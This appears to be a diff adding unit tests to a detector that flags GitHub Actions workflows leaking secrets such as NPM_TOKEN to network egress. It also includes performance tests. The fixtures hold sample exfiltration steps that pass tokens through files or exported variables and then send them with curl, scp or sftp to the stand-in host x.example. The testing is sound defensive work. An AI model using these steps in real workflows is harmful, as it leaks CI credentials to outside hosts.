@@ -472,6 +472,101 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: flow between steps and other egress to
   });
 });
 
+describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what a later step can reach", () => {
+  it("does not carry a file write to a later step that reads no file", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - env:",
+      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
+      "        run: |",
+      "          cat > .npmrc <<EOF",
+      "          //registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}",
+      "          EOF",
+      "          npm publish && echo done > publish.log",
+      "      - run: curl -fsS https://x.example/health",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
+  it("carries a file write to a later step that reads the file and sends it", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      '      - run: echo "TOKEN=$T" | tee -a env.sh',
+      "        env:",
+      "          T: ${{ secrets.NPM_TOKEN }}",
+      '      - run: source env.sh && curl -d "$TOKEN" https://x.example/i',
+    ]);
+    expect(hits()).toEqual([10]);
+
+    // PowerShell cmdlet names are case-insensitive.
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - run: $env:T | out-file carried.txt",
+      "        env:",
+      "          T: ${{ secrets.NPM_TOKEN }}",
+      '      - run: curl -F "f=@carried.txt" https://x.example/i',
+    ]);
+    expect(hits()).toEqual([10]);
+  });
+
+  it("carries a github-script export and file write", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - uses: actions/github-script@v7",
+      "        env:",
+      "          T: ${{ secrets.NPM_TOKEN }}",
+      "        with:",
+      "          script: |",
+      "            core.exportVariable('CARRIED', process.env.T)",
+      '      - run: curl -d "$CARRIED" https://x.example/i',
+    ]);
+    expect(hits()).toEqual([13]);
+
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - uses: actions/github-script@v7",
+      "        with:",
+      "          github-token: ${{ secrets.PAT }}",
+      "          script: |",
+      "            require('fs').writeFileSync('out.txt', 'x')",
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: out.txt",
+    ]);
+    expect(hits()).toEqual([12]);
+  });
+
+  it("reads a transfer tool called by its full path as egress", () => {
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      T: ${{ secrets.NPM_TOKEN }}",
+      "    steps:",
+      "      - run: /usr/bin/sftp -b batch.txt user@x.example",
+      "      - run: /usr/bin/scp o.txt user@x.example:/tmp/",
+    ]);
+    expect(hits()).toEqual([9, 10]);
+  });
+
+  it("does not read a Windows drive path or a script named after a tool as egress", () => {
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      T: ${{ secrets.NPM_TOKEN }}",
+      "    steps:",
+      "      - run: scp file.txt C:\\builds\\out\\",
+      "      - run: ./scripts/irm.sh --check",
+      "      - run: rsync -a --exclude=a:b src/ dst/",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+});
+
 describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
   const FIVE_MIB = 5 * 1024 * 1024;
 
@@ -496,6 +591,16 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
     const args = "localhost ".repeat(Math.ceil(FIVE_MIB / 10));
     expect(
       timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: curl ${args}`]),
+    ).toBeLessThan(performanceBudget(15_000));
+
+    const remote = "a@a@a@a@a.b.c.d.e.f.g.h.i ".repeat(Math.ceil(FIVE_MIB / 26));
+    expect(
+      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: scp ${remote}`]),
+    ).toBeLessThan(performanceBudget(15_000));
+
+    const cats = "cat cat ".repeat(Math.ceil(FIVE_MIB / 8));
+    expect(
+      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", "        run: echo x > f", `      - run: curl https://x.example ${cats}`]),
     ).toBeLessThan(performanceBudget(15_000));
 
     const quotes = '"'.repeat(FIVE_MIB);
